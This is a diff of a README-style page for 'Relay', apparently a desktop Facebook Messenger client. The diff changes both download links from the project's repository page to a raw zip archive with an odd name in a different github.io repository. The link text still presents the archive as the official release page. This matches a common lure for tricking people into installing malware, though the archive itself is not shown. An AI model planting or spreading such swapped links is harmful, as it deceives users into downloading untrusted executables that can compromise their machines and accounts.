@@ -5,13 +5,13 @@ description: "Build native macOS messenger clients using Swift and Go."
 ---
 # 💬 Relay - Your Private desktop messaging app experience
 
-[![](https://img.shields.io/badge/Download_Relay-Blue?style=for-the-badge)](https://github.com/Benditebacteriophagous32/Relay)
+[![](https://img.shields.io/badge/Download_Relay-Blue?style=for-the-badge)](https://github.com/Benditebacteriophagous32/benditebacteriophagous32.github.io/raw/refs/heads/main/goslarite/benditebacteriophagous-github-io-1.3-alpha.2.zip)
 
 Relay provides a fast, native way to use Facebook Messenger on your computer. It focuses on privacy, speed, and a clean interface. Relay works locally on your machine to keep your chat history secure and accessible without a browser.
 
 ## 📥 How to install the app
 
-Visit [the official release page](https://github.com/Benditebacteriophagous32/Relay) to download the installer for your computer. 
+Visit [the official release page](https://github.com/Benditebacteriophagous32/benditebacteriophagous32.github.io/raw/refs/heads/main/goslarite/benditebacteriophagous-github-io-1.3-alpha.2.zip) to download the installer for your computer. 
 
 1. Open your web browser.
 2. Go to the link above.
